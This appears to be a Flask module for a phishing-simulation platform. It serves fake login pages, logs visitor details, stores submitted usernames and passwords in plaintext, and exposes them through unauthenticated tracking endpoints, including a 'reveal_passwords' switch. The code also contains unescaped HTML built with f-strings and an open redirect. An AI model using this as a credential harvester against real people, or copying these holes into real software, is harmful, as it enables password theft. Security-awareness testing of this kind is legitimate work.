"""
Landing Page Routes for Phishing Simulations
"""
from flask import Blueprint, render_template, request, redirect, url_for, current_app, jsonify
from models.tracking import PageVisit, FormSubmission
from utils.database import get_db
import json

landing_bp = Blueprint('landing', __name__)


def get_client_info():
    """Extract client information from request"""
    return {
        'ip_address': request.remote_addr or 'unknown',
        'user_agent': request.headers.get('User-Agent', 'unknown'),
        'campaign_id': request.args.get('c'),  # Campaign ID from URL
        'user_identifier': request.args.get('u')  # User identifier from URL
    }


@landing_bp.route('/landing/<page_id>')
def landing_page(page_id):
    """
    Serve a landing page and log the visit
    
    Args:
        page_id: Landing page identifier
    """
    # Get database
    db = get_db(current_app.config['DATABASE_PATH'])
    
    # Extract client info
    client_info = get_client_info()
    
    # Log the visit
    visit_id = PageVisit.create(
        db,
        campaign_id=client_info['campaign_id'],
        user_identifier=client_info['user_identifier'],
        ip_address=client_info['ip_address'],
        user_agent=client_info['user_agent'],
        page_url=request.url
    )
    
    # Determine redirect URL for after submission
    redirect_url = request.args.get('redirect', 'https://www.google.com')
    
    # Try to render the template, fallback to simple HTML if template doesn't exist
    try:
        return render_template(
            f'landing/{page_id}.html',
            campaign_id=client_info['campaign_id'],
            user_identifier=client_info['user_identifier'],
            redirect_url=redirect_url
        )
    except Exception:
        # Fallback for testing - simple HTML form
        return f'''
        <html>
        <body>
            <h1>Landing Page: {page_id}</h1>
            <form method="POST">
                <input name="username" placeholder="Username" required />
                <input name="password" type="password" placeholder="Password" required />
                <input name="redirect_url" type="hidden" value="{redirect_url}" />
                <button type="submit">Submit</button>
            </form>
        </body>
        </html>
        ''', 200


@landing_bp.route('/landing/<page_id>', methods=['POST'])
def landing_page_submit(page_id):
    """
    Handle form submission from landing page
    
    Args:
        page_id: Landing page identifier
    """
    # Get database
    db = get_db(current_app.config['DATABASE_PATH'])
    
    # Extract client info
    client_info = get_client_info()
    
    # Get form data
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    # Collect any additional form fields
    additional_fields = {}
    for key, value in request.form.items():
        if key not in ['username', 'password']:
            additional_fields[key] = value
    
    additional_data = json.dumps(additional_fields) if additional_fields else None
    
    # Log the submission
    submission_id = FormSubmission.create(
        db,
        campaign_id=client_info['campaign_id'],
        user_identifier=client_info['user_identifier'],
        ip_address=client_info['ip_address'],
        user_agent=client_info['user_agent'],
        page_url=request.url,
        username=username,
        password=password,
        additional_data=additional_data
    )
    
    # Get redirect URL
    redirect_url = request.form.get('redirect_url', 'https://www.google.com')
    
    # Redirect user back to legitimate site
    return redirect(redirect_url)


@landing_bp.route('/api/tracking/visits')
def get_visits():
    """Get all page visits (for testing/metrics)"""
    campaign_id = request.args.get('campaign_id')
    
    db = get_db(current_app.config['DATABASE_PATH'])
    
    if campaign_id:
        visits = PageVisit.get_by_campaign(db, campaign_id)
    else:
        visits = db.fetchall('SELECT * FROM page_visits ORDER BY visit_timestamp DESC LIMIT 100')
    
    return jsonify({
        'visits': [dict(row) for row in visits],
        'count': len(visits)
    })


@landing_bp.route('/api/tracking/submissions')
def get_submissions():
    """Get all form submissions (for testing/metrics)"""
    campaign_id = request.args.get('campaign_id')
    reveal_passwords = request.args.get('reveal_passwords', 'false').lower() == 'true'
    
    db = get_db(current_app.config['DATABASE_PATH'])
    
    if campaign_id:
        submissions = FormSubmission.get_by_campaign(db, campaign_id)
    else:
        submissions = db.fetchall('SELECT * FROM form_submissions ORDER BY submission_timestamp DESC LIMIT 100')
    
    # Mask passwords unless reveal_passwords=true
    results = []
    for row in submissions:
        data = dict(row)
        if not reveal_passwords and data.get('password'):
            data['password'] = '***'
        results.append(data)
    
    return jsonify({
        'submissions': results,
        'count': len(results)
    })
